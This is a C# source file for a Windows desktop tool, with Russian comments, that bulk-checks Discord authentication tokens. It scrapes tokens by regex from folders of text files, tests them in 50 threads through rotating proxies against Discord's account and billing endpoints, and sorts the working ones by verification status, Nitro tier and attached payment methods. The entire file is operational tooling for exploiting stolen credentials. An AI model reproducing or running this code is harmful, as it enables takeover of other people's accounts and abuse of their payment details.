using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xNet;
namespace DiscordTokenChecker_by_wDude
{
    // Некоторые переменные или методы могут начинаться с нижнего подчёркивания (например: _BlahBlah). Это не чужой код, также мой. Просто мне стало в падлу везде ставить нижнее подчёркивание :D
    class Functions
    {
        public Queue<string> TokenList = new Queue<string>(); //Список токенов, по которому пройдёмся
        public Queue<string> ProxyList = new Queue<string>(); //Список прокси, который будет использоваться

        public List<string> GoodTokens = new List<string>(); //Рабочие токены
        public List<string> VerifiedTokens = new List<string>(); //Токены с верификацией
        public List<string> UnverifiedTokens = new List<string>(); //Токены без верификации
        public List<string> WithPaymentMethodsTokens = new List<string>(); //Токены с методами оплаты
        public List<string> WithoutPaymentMethodsTokens = new List<string>(); //Токены без методов оплаты
        public List<string> WithFullNitroTokens = new List<string>(); //Токены с полным нитро
        public List<string> WithClassicNitroTokens = new List<string>();//Токены с нитро классик

        string tokenPattern = @"[A-Za-z0-9][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}"; // Регулярное выражение для нахождения токена в файлах

        public List<Thread> ThreadsList = new List<Thread>(); // Список для работы с потоками

        public Form1 MainForm; // Ссылка на главную форму

        public ProxyType _proxyType = new ProxyType();

        public bool TokensImported;
        public bool ProxysImported;

        public int numOfThreads = 50; // Кол-во потоков, по стандарту 50, меняется при изменении положения ползунка
        public int numOfDoubles; // Кол-во удалённых дублей токенов

        public string workedProxy;

        

        public async void GetTokensFromFile() //Импорт токенов из текстового файла
        {
            MainForm.mainStartButton.Enabled = false;
            try //Если будут ошибки, то программа не закроется
            {
                using (FileDialog tokenDialog = new OpenFileDialog()) //Открываю окно, в котором нужно выбрать файл
                {
                    tokenDialog.Filter = "Текстовые документы (*.txt)|*.txt"; //Фильтр выбора файла (только текстовые файлы)
                    tokenDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
                    tokenDialog.Title = "Выберите текстовый документ, в котором находится список токенов...";
                    DialogResult dialogResult = tokenDialog.ShowDialog();
                    if (dialogResult == DialogResult.OK && tokenDialog.FileName.Length > 0) //Если файл выбран, идём дальше
                    {
                        await Task.Run(() =>
                        {
                            string[] tokens = File.ReadAllLines(tokenDialog.FileName); //Читаем строки из файла и заносим в массив
                            numOfDoubles = 0;
                            if (tokens.Length > 0) //Если число элементов массива больше 0, то идём дальше
                            {
                                foreach (var token in tokens) //Проходимся по каждому элементу
                                {
                                    if (!TokenList.Contains(token) && token != null) //Проверка на дубли
                                    {
                                        TokenList.Enqueue(token);
                                    }
                                    else
                                        numOfDoubles++;
                                }
                                if (TokenList.Count > 0) //После, если число токенов в списке больше 0 то перекрашиваю кнопку и изменяю булевую функцию, для изменения функции кнопки.
                                {
                                    MainForm.mainStartButton.Text = $"Импортированно токенов: {TokenList.Count}"; //Изменяю текст кнопки
                                    MainForm.leftTokensLabel.Text = TokenList.Count.ToString(); //изменяю текст лебла кол-ва оставшихся токенов
                                    MainForm.mainStartButton.BackColor = Color.FromArgb(88, 101, 242);
                                    MainForm.mainStartButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(71, 82, 196);
                                    MainForm.mainStartButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(71, 82, 196);
                                    TokensImported = true; //Изменяю булевую если всё ок
                                }
                                else //Если токенов в списке не больше 0, то ничего не делаю и булевая остаётся ложью
                                {
                                    TokensImported = false;
                                }
                            }
                            else //Кастомная ошибка на случай отсутствия строк в файле
                            {
                                MessageBox.Show("При импорте токенов произошла ошибка, возможно в текстовом документе небыло токенов...", "Ошибка при импорте токенов", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        });
                    }
                    tokenDialog.Dispose();
                }
            }
            catch (Exception ex) //Отлавливаю ошибку и вывожу пользователю
            {
                MessageBox.Show($"При импорте токенов произошла ошибка: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            MainForm.mainStartButton.Enabled = true;
        }

        public async void GetTokensFromPaths() // Импорт токенов из выбранной пользователем папки при помощи регулярки
        {
            MainForm.mainStartButton.Enabled = false;
            try //Если будут ошибки, то программа не закроется
            {
                using (FolderBrowserDialog folderDialog = new FolderBrowserDialog()) // Определяю
                {
                    folderDialog.Description = "Выберите папку для поиска токенов...";
                    DialogResult dialogResult = folderDialog.ShowDialog(); // Открываю окно выбора
                    folderDialog.Dispose(); // Освобождаю ресурсы
                    if (dialogResult == DialogResult.OK && folderDialog.SelectedPath != null) // Проверяю на выбор папки и нажатие окей
                    {
                        await Task.Run(() =>
                        {
                            string[] filesInDirectory = Directory.GetFiles(folderDialog.SelectedPath, "*.txt", SearchOption.AllDirectories); // Союздаю массив файлов в папке и её подпапках
                            foreach (var file in filesInDirectory) // Прохожусь по каждому файлу 
                            {
                                if (File.ReadAllText(file) != null) // Проверка на пустоту файла, если не пустой иду дальше
                                {
                                    foreach (string token in File.ReadAllLines(file)) // Прохожусь по каждой строке файла
                                    {
                                        if (Regex.IsMatch(token, tokenPattern, RegexOptions.Compiled)) // Если находится соответствие паттерну регулярки, то иду дальше
                                        {
                                            if (!TokenList.Contains(Regex.Match(token, tokenPattern).Value)) // Проверяю на наличие найденного токена в листах, дабы избежать дублей
                                                TokenList.Enqueue(Regex.Match(token, tokenPattern).Value); // Добавляю токен
                                            else
                                                numOfDoubles++; // Увеличиваю счётчик дублей если такой токен уже есть
                                        }
                                    }
                                    if (TokenList.Count > 0) //После, если число токенов в списке больше 0 то перекрашиваю кнопку и изменяю булевую функцию, для изменения функции кнопки.
                                    {
                                        MainForm.mainStartButton.Text = $"Импортированно токенов: {TokenList.Count}"; //Изменяю текст кнопки
                                        MainForm.leftTokensLabel.Text = TokenList.Count.ToString(); //изменяю текст лебла кол-ва оставшихся токенов
                                        MainForm.mainStartButton.BackColor = Color.FromArgb(88, 101, 242);
                                        MainForm.mainStartButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(71, 82, 196);
                                        MainForm.mainStartButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(71, 82, 196);
                                        TokensImported = true; //Изменяю булевую если всё ок
                                    }
                                    else //Если токенов в списке не больше 0, то ничего не делаю и булевая остаётся ложью
                                    {
                                        TokensImported = false;
                                    }
                                }
                            }
                        });
                    }
                }
            }
            catch (Exception ex) //Отлавливаю ошибку и вывожу пользователю
            {
                MessageBox.Show($"При парсе и импорте токенов произошла ошибка: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            MainForm.mainStartButton.Enabled = true;
        }

        public void SaveAllTokens() // Сохранить все токены из списка
        {
            if (TokenList.Count > 0)
            {
                string allTokensFile = $"[{DateTime.Now.Hour}.{DateTime.Now.Minute}] Не проверенные токены (ВСЕ).txt";
                File.WriteAllLines(allTokensFile, TokenList);
                Process.Start(allTokensFile);
            }
            else
                MessageBox.Show("Не удалось сохранить все токены, так как список токенов пуст. Пожалуйста импортируйте токены!", "Не удалось сохранить", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }

        public void GetProxysFromFile()
        {
            try //Повторяю практически всё тоже самое, что и с импортом токенов из файла
            {
                using (FileDialog proxyDialog = new OpenFileDialog())
                {
                    proxyDialog.Filter = "Текстовые документы (*.txt)|*.txt";
                    proxyDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";
                    proxyDialog.Title = "Выберите тектовый документ со списком прокси...";
                    DialogResult dialogResult = proxyDialog.ShowDialog();
                    if (dialogResult == DialogResult.OK && proxyDialog.FileName.Length > 0)
                    {
                        string[] proxys = File.ReadAllLines(proxyDialog.FileName);
                        if (proxys.Length > 0)
                        {
                            foreach (var proxy in proxys)
                            {
                                if (!ProxyList.Contains(proxy))
                                {
                                    ProxyList.Enqueue(proxy);
                                }
                            }
                            if (ProxyList.Count > 0)
                            {
                                ProxysImported = true;
                                MainForm.button4.Text = $"Импортированно прокси: {ProxyList.Count}";
                                MainForm.button4.FlatAppearance.BorderColor = Color.FromArgb(71, 82, 196);
                                MainForm.button4.BackColor = Color.FromArgb(88, 101, 242);
                                MainForm.button4.ForeColor = Color.FromArgb(239, 255, 250);
                                MainForm.button4.FlatAppearance.MouseDownBackColor = Color.FromArgb(71, 82, 196);
                                MainForm.button4.FlatAppearance.MouseOverBackColor = Color.FromArgb(71, 82, 196);
                            }
                            else
                            {
                                ProxysImported = false;
                            }
                        }
                        else
                        {
                            MessageBox.Show("При импорте прокси произошла ошибка, возможно в текстовом документе небыло прокси...", "Ошибка при импорте прокси", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    proxyDialog.Dispose();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"При импорте прокси произошла ошибка: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        } //Импорт прокси из текстового файла

        public void StartWorking() //Метод отвечающий за применение всех настроек и начало чека
        {
            for (int i = 0; i < numOfThreads; i++)
            {
                Thread worker = new Thread(MainWorker);
                worker.Priority = ThreadPriority.AboveNormal;
                worker.Start();
                ThreadsList.Add(worker);
            }
        }

        public void StopWorking() // Метод, отвечающий за завершение всех потоков
        {
            while (ThreadsList.Count != 0)
            {
                if (ThreadsList[0].IsAlive && ThreadsList[0].ThreadState != System.Threading.ThreadState.Running)
                {
                    ThreadsList[0].Abort();
                    ThreadsList.Remove(ThreadsList[0]);
                }
            }
            MainForm.mainStartButton.Text = $"Импортированно токенов: {TokenList.Count}";
            if (TokenList.Count == 0)
                TokensImported = false;
            SaveTokens();
            GC.Collect();
        }

        public void MainWorker() // Метод выполняющий всё
        {
            while (TokenList.Count > 0) // Пока в очереди больше 0 элементов, проходимся
            {
                string dequeuedToken = TokenList.Dequeue(); //Присваиваю переменной вытянутый из очереди токен
                string dequeuedProxy;
                try
                {
                    HttpRequest _mainRequest = new HttpRequest(); //Создаю запрос
                    _mainRequest.UserAgent = Http.ChromeUserAgent();
                    if (ProxysImported) // Проверка на импорт прокси и тип прокси, если импортированны, то использую
                    {
                        if (workedProxy == null)
                            dequeuedProxy = ProxyList.Dequeue();
                        else
                            dequeuedProxy = workedProxy;
                        _mainRequest.Proxy = ProxyClient.Parse(_proxyType, dequeuedProxy);
                    }
                    _mainRequest.IgnoreProtocolErrors = true;
                    _mainRequest.AddHeader("authorization", dequeuedToken);
                    var _mainResponse = _mainRequest.Get("https://discord.com/api/v9/users/@me"); // Отправляю запрос
                    if (ProxysImported) //Если смог подключиться к серверу  и прокси используются, но токен не верный то записываем его для дальнейшего использования
                        workedProxy = _mainRequest.Proxy.ToString();
                    if (_mainResponse.IsOK)
                    {
                        GoodTokens.Add(dequeuedToken);
                        var _json_deserialize_main = JsonConvert.DeserializeObject<JsonDeserialize>(_mainResponse.ToString());
                        if (_json_deserialize_main.email != null && _json_deserialize_main.phone != null && _json_deserialize_main.verified)
                            VerifiedTokens.Add(dequeuedToken);
                        else
                            UnverifiedTokens.Add(dequeuedToken);

                        switch (_json_deserialize_main.premium_type)
                        {
                            case 1:
                                WithClassicNitroTokens.Add(dequeuedToken);
                                break;
                            case 2:
                                WithFullNitroTokens.Add(dequeuedToken);
                                break;
                        }

                        // Второй запрос, повторяются настройки, так как после первого они сбрасываются
                        _mainRequest.UserAgent = Http.ChromeUserAgent();
                        if (ProxysImported) // Проверка на импорт прокси и тип прокси, если импортированно, то использую
                        {
                            if (workedProxy == null)
                                dequeuedProxy = ProxyList.Dequeue();
                            else
                                dequeuedProxy = workedProxy;
                            _mainRequest.Proxy = ProxyClient.Parse(_proxyType, dequeuedProxy);
                        }
                        _mainRequest.AddHeader("authorization", dequeuedToken);
                        _mainRequest.IgnoreProtocolErrors = true;
                        _mainRequest.Get("https://discord.com/api/v9/users/@me/billing/payment-sources");
                        if (_mainRequest.Response.IsOK && _mainRequest.Response.ToString().Replace("[", "").Replace("]", "").Replace("{", "").Replace("}", "") != "")
                            WithPaymentMethodsTokens.Add(dequeuedToken);
                        else
                            WithoutPaymentMethodsTokens.Add(dequeuedToken);
                    }
                }
                catch (HttpException ex)
                {
                    if (ex.HttpStatusCode != xNet.HttpStatusCode.Unauthorized) // Проверка на ошибку, если ошибка не в неверности токена, то токен возвращается и выполняются другие инструкции
                    {
                        var AllLists = new List<List<string>>() // Список списков, по которому буду проходиться, костыль пздц.
                        {
                            GoodTokens, VerifiedTokens,
                            UnverifiedTokens, WithClassicNitroTokens,
                            WithFullNitroTokens, WithPaymentMethodsTokens,
                            WithoutPaymentMethodsTokens
                        };
                        foreach (var collection in AllLists) // Прохожусь по каждому элементу списка списков и удаляю токен, если есть в списке, чтобы избежать повтора.
                        {
                            if (collection.Contains(dequeuedToken))
                                collection.Remove(dequeuedToken);
                        }
                        TokenList.Enqueue(dequeuedToken);
                        workedProxy = null;
                    }
                }
                catch
                {

                }
            }
            if (ThreadsList.Contains(Thread.CurrentThread))
            {
                ThreadsList.Remove(Thread.CurrentThread);
                if (ThreadsList.Count == 0)
                    StopWorking();
            }
        }

        public void SaveTokens() // Метод, сохраняющий все токены в текстовые документы.
        {
            string _dirName = $"Результаты проверки [{DateTime.Now.Hour}.{DateTime.Now.Minute}]";
            if (!Directory.Exists(_dirName) && GoodTokens.Count > 0)
            {
                Directory.CreateDirectory(_dirName);
                File.WriteAllLines($@"{_dirName}\[{GoodTokens.Count}]Рабочие токены.txt", GoodTokens);
                File.WriteAllLines($@"{_dirName}\[{VerifiedTokens.Count}]Токены с верификацией.txt", VerifiedTokens);
                File.WriteAllLines($@"{_dirName}\[{UnverifiedTokens.Count}]Токены без верификации.txt", UnverifiedTokens);
                File.WriteAllLines($@"{_dirName}\[{WithPaymentMethodsTokens.Count}]Токены с методами оплаты.txt", WithPaymentMethodsTokens);
                File.WriteAllLines($@"{_dirName}\[{WithoutPaymentMethodsTokens.Count}]Токены без методов оплаты.txt", WithoutPaymentMethodsTokens);
                File.WriteAllLines($@"{_dirName}\[{WithFullNitroTokens.Count}]Токены с Nitro (FULL).txt", WithFullNitroTokens);
                File.WriteAllLines($@"{_dirName}\[{WithClassicNitroTokens.Count}]Токены с Nitro (Classic).txt", WithClassicNitroTokens);
            }
            NotifyIcon tokensNotify = new NotifyIcon(); // Создаю новое всплывающее окно.
            tokensNotify.Icon = MainForm.Icon;
            tokensNotify.Visible = true;
            tokensNotify.ShowBalloonTip(2000, "Токены сохранены", "Токены были успешно сохранены в папке с софтом!", ToolTipIcon.Info);
            tokensNotify.Dispose();
        }

        public void CheckStartPath() // Метод, который проверяет в какой папке была запущена программа, если с рабочего стола то предлагает совершить некоторые действия и закрывается
        {
            if (Directory.GetCurrentDirectory().ToLower().EndsWith(@"desktop"))
            {
                MessageBox.Show("Доброго времени суток!\n" +
                    "Тут небольшая проблемка, которую очень легко решить!\n" +
                    "Судя по всему ты запускаешь программу с рабочего стола, так делать не нужно!\n" +
                    "Для твоего удобства, создай папку на рабочем столе и перемести программу туда,после просто запусти её из созданной папки.\n" +
                    "Спасибо за внимание.", "Важная информация", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Application.Exit();
            }
            else
                MainForm.resultsAppStartPathLabel.Text = Directory.GetCurrentDirectory();

        }

    }
}
